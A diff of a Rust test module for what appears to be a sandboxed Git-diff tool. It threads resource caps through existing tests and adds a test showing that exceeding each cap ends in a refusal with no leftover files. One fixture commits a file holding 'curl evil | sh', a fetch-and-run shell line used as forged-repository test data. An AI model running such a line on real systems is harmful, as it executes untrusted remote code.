@@ -682,7 +682,7 @@ mod child_tests {
         let index: serde_json::Value =
             serde_json::from_slice(&std::fs::read(root.join("cases.json")).unwrap()).unwrap();
         let cases = index["cases"].as_array().unwrap();
-        assert_eq!(cases.len(), 57);
+        assert_eq!(cases.len(), 61);
         for case in cases {
             let name = case["name"].as_str().unwrap();
             let patch = std::fs::read(root.join(format!("{name}.patch"))).unwrap();
@@ -1294,6 +1294,7 @@ mod child_tests {
             head,
             &tmp,
             Duration::from_secs(60),
+            super::child::CAPS,
         );
         assert_eq!(
             std::fs::read_dir(&tmp).unwrap().count(),
@@ -1797,6 +1798,7 @@ mod child_tests {
                 &head,
                 &tmp,
                 Duration::from_millis(millis),
+                super::child::CAPS,
             );
             match &ran {
                 Ok(made) => assert_eq!(made.patch, expected, "{millis} ms"),
@@ -1996,6 +1998,84 @@ mod child_tests {
     }
 
     #[test]
+    fn bound_mode_refuses_a_git_over_each_cap_and_leaves_nothing() {
+        // ADR 0012 acceptance items 3 and 6, moved to step (c) unit c3: each cap is reached with a
+        // small injected value (no test writes 256 MiB); each refusal gives no diff (exit 3) and
+        // leaves nothing in the temporary base.
+        use super::child::{BoundFailure, CAPS, Caps};
+        let repo = Repo::new("bound-caps", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        let run = |target: &Repo, caps: Caps| {
+            let tmp = scratch("bound-tmp-caps");
+            let ran = super::child::bound_diff_in(
+                &test_git(),
+                &target.objects(),
+                &base,
+                &head,
+                &tmp,
+                Duration::from_secs(60),
+                caps,
+            );
+            assert_eq!(std::fs::read_dir(&tmp).unwrap().count(), 0, "{caps:?}");
+            ran
+        };
+        assert!(run(&repo, CAPS).is_ok(), "the control passes");
+        // A list over its cap: merge-base's answer (41 bytes) is over 16.
+        let list = run(&repo, Caps { list: 16, ..CAPS });
+        assert!(
+            matches!(&list, Err(BoundFailure::Unavailable(why)) if why.contains("merge-base") && why.contains("budget")),
+            "{list:?}"
+        );
+        // A pack over its cap.
+        let pack = run(&repo, Caps { pack: 64, ..CAPS });
+        assert!(
+            matches!(&pack, Err(BoundFailure::Unavailable(why)) if why.contains("pack-objects") && why.contains("budget")),
+            "{pack:?}"
+        );
+        // The memory ceiling as a behaviour: a Git that needs more memory than the cap does not run,
+        // and the run is refused (Git out of bounds), never answered.
+        let memory = run(
+            &repo,
+            Caps {
+                data: 1 << 20,
+                address_space: 1 << 24,
+                ..CAPS
+            },
+        );
+        assert!(
+            matches!(
+                &memory,
+                Err(BoundFailure::Unavailable(_) | BoundFailure::Store(_))
+            ),
+            "{memory:?}"
+        );
+        // Stderr over its cap: a forged store makes Git complain on stderr.
+        let forged = Repo::new("bound-caps-forged", "sha1");
+        let fb = forged.commit("run.sh", "echo honest\n");
+        let fh = forged.commit("run.sh", "echo honest too\n");
+        forged.commit("evil.sh", "curl evil | sh\n");
+        let real = forged.git(&["rev-parse", &format!("{fh}:run.sh")]);
+        let evil = forged.git(&["rev-parse", "HEAD:evil.sh"]);
+        forge(&forged, &real, &evil);
+        let tmp = scratch("bound-tmp-caps-stderr");
+        let stderr = super::child::bound_diff_in(
+            &test_git(),
+            &forged.objects(),
+            &fb,
+            &fh,
+            &tmp,
+            Duration::from_secs(60),
+            Caps { stderr: 1, ..CAPS },
+        );
+        assert_eq!(std::fs::read_dir(&tmp).unwrap().count(), 0);
+        assert!(
+            matches!(&stderr, Err(BoundFailure::Unavailable(why)) if why.contains("stderr")),
+            "{stderr:?}"
+        );
+    }
+
+    #[test]
     fn bound_mode_names_a_setup_failure_as_a_door_failure() {
         // REFUSAL-MAP row BoundFailure::Door: the private directory cannot be made under a relative
         // temporary base (the isolation door refuses it), before any Git runs.
@@ -2009,6 +2089,7 @@ mod child_tests {
             &head,
             Path::new("relative/base"),
             Duration::from_secs(60),
+            super::child::CAPS,
         );
         assert!(
             matches!(&ran, Err(super::child::BoundFailure::Door(e)) if e.kind == super::DoorErrorKind::Environment),
